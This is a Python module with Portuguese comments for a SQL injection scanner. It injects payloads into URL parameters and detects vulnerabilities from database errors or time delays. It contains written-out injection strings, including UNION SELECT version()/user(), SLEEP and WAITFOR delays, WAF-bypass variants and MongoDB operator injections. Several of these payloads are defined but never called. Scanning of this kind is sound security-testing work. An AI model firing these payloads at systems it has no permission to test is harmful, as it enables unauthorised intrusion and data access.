"""
Scanner de SQL Injection v3.0
O ataque mais famoso do bairro. A gente envia uns textos 'maliciosos'
e vê se o banco de dados 'cospe' um erro. Se cuspir, bingo!
"""

import time
import random
import re
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, quote
from typing import Dict, List, Optional, Tuple
from enum import Enum
from scans.base_scanner import BaseScanner

class SQLDatabase(Enum):
    MYSQL = "mysql"
    POSTGRESQL = "postgresql"
    ORACLE = "oracle"
    SQLSERVER = "sqlserver"
    SQLITE = "sqlite"
    UNKNOWN = "unknown"

class InjectionType(Enum):
    ERROR_BASED = "error_based"
    BOOLEAN_BASED = "boolean_based"
    TIME_BASED = "time_based"
    UNION_BASED = "union_based"
    STACKED_QUERIES = "stacked_queries"
    NOSQL = "nosql"

class SQLInjectionScanner(BaseScanner):
    def __init__(self, target_url: str, timeout: int = 10, aggressive: bool = False,
                 detect_blind: bool = True, test_nosql: bool = False):
        super().__init__(target_url, timeout)
        
        self.aggressive = aggressive
        self.detect_blind = detect_blind
        self.test_nosql = test_nosql
        self.detected_db = SQLDatabase.UNKNOWN
        self.base_response_time = 0
        
    def get_db_specific_payloads(self, db_type: SQLDatabase) -> Dict[str, List[str]]:
        """Pega os 'venenos' certos para cada tipo de banco de dados."""
        payloads = {
            SQLDatabase.MYSQL: {
                'error_based': ["'"],
                'union_based': ["' UNION SELECT null,version(),user() -- "],
                'time_based': ["' AND SLEEP(5) -- "],
                'boolean_based': ["' AND 1=1 -- ", "' AND 1=2 -- "],
            },
            SQLDatabase.POSTGRESQL: {
                'error_based': ["'"],
                'time_based': ["' AND pg_sleep(5) -- "],
            },
            SQLDatabase.SQLSERVER: {
                'error_based': ["'"],
                'time_based': ["' AND WAITFOR DELAY '0:0:5' -- "],
            }
        }
        return payloads.get(db_type, payloads[SQLDatabase.MYSQL])
    
    def get_waf_bypass_payloads(self) -> List[str]:
        """Payloads com maquiagem pra tentar enganar os firewalls."""
        return ["/*!50000'*/", "'%20OR%201=1--", "'/**/OR/**/1=1--"]
    
    def get_nosql_payloads(self) -> Dict[str, List[str]]:
        """Payloads pra bancos de dados 'moderninhos' (NoSQL)."""
        return {
            'mongo_operator': ['{"$ne": "invalid"}', '{"$gt": ""}'],
            'json_injection': ['{"username": {"$ne": null}}']
        }
    
    def detect_database_type(self, response_text: str) -> SQLDatabase:
        """Tenta adivinhar qual banco de dados o site usa, com base nos erros que ele mostra."""
        error_patterns = {
            SQLDatabase.MYSQL: [r"mysql_"],
            SQLDatabase.POSTGRESQL: [r"PostgreSQL"],
            SQLDatabase.SQLSERVER: [r"Microsoft SQL Server"],
            SQLDatabase.ORACLE: [r"ORA-\d+"],
            SQLDatabase.SQLITE: [r"SQLite"]
        }
        for db_type, patterns in error_patterns.items():
            if any(re.search(p, response_text, re.I) for p in patterns):
                self.add_info(f"Banco de dados detectado: {db_type.value}")
                return db_type
        return SQLDatabase.UNKNOWN
    
    def establish_baseline(self, url: str) -> Tuple[float, int]:
        """Mede o tempo de resposta normal do site pra gente ter uma base de comparação."""
        start_time = time.time()
        response = self.test_endpoint(url)
        return (time.time() - start_time), len(response.content) if response else 0

    def test_injection(self, param: str, value: str, technique: str, db_type: SQLDatabase) -> bool:
        """Função genérica para testar diferentes tipos de injeção."""
        payloads = self.get_db_specific_payloads(db_type).get(technique, [])
        if not payloads: return False

        if technique == 'time_based':
            baseline_time, _ = self.establish_baseline(self.build_test_url(param, value))
            for payload in payloads:
                test_url = self.build_test_url(param, payload)
                start_time = time.time()
                self.test_endpoint(test_url)
                if (time.time() - start_time) > baseline_time + 4: return True
            return False
            
        elif technique == 'error_based':
            for payload in payloads:
                test_url = self.build_test_url(param, payload)
                response = self.test_endpoint(test_url)
                if response and self.analyze_sql_errors(response.text, db_type): return True
            return False

        return False

    def analyze_sql_errors(self, response_text: str, db_type: SQLDatabase) -> bool:
        """Procura por mensagens de erro de SQL no código da página."""
        patterns = {
            SQLDatabase.MYSQL: [r"SQL syntax.*MySQL"],
            SQLDatabase.UNKNOWN: [r"SQL syntax", r"unclosed quotation mark"]
        }
        search_patterns = patterns.get(db_type, patterns[SQLDatabase.UNKNOWN])
        return any(re.search(p, response_text, re.I) for p in search_patterns)

    def build_test_url(self, param: str, payload: str, **kwargs) -> str:
        """Monta a URL de teste com nosso payload 'malicioso'."""
        parsed = urlparse(self.target_url)
        params = parse_qs(parsed.query)
        if param in params:
            params[param] = [payload]
            new_query = urlencode(params, doseq=True)
            return urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment))
        return self.target_url

    def test_parameter_comprehensive(self, param: str, value: str) -> List[Dict]:
        """Testa um único parâmetro com todas as nossas cartas na manga."""
        vulnerabilities = []
        response = self.test_endpoint(self.build_test_url(param, "'"))
        if response:
            self.detected_db = self.detect_database_type(response.text)

        techniques = ['error_based']
        if self.detect_blind:
            techniques.append('time_based')

        for tech in techniques:
            if self.test_injection(param, value, tech, self.detected_db):
                vuln = {'parameter': param, 'technique': tech, 'database': self.detected_db.value}
                vulnerabilities.append(vuln)
                self.add_vulnerability(f"SQL Injection ({tech}) no parâmetro '{param}' (DB: {self.detected_db.value})")

        return vulnerabilities

    def scan(self):
        """Roda o scan completo de SQL Injection."""
        print(f"    [+] Executando scan de SQL Injection em: {self.target_url}")
        if not self.is_valid_url():
            self.add_warning("URL inválida")
            return self.results
        
        start_time = time.time()
        all_vulnerabilities = []
        
        try:
            parsed = urlparse(self.target_url)
            params = parse_qs(parsed.query)
            
            if params:
                self.add_info(f"Testando {len(params)} parâmetros GET...")
                for param, values in params.items():
                    if values:
                        all_vulnerabilities.extend(self.test_parameter_comprehensive(param, values[0]))
            
            scan_duration = time.time() - start_time
            self.add_info(f"⏱️ Duração do scan: {scan_duration:.2f} segundos")
            
            self.results['sql_injection_report'] = {
                'total_vulnerabilities': len(all_vulnerabilities),
                'detected_database': self.detected_db.value,
                'vulnerabilities': all_vulnerabilities,
            }
            
        except Exception as e:
            self.add_warning(f"Erro durante scan de SQL Injection: {str(e)}")
        
        return self.results
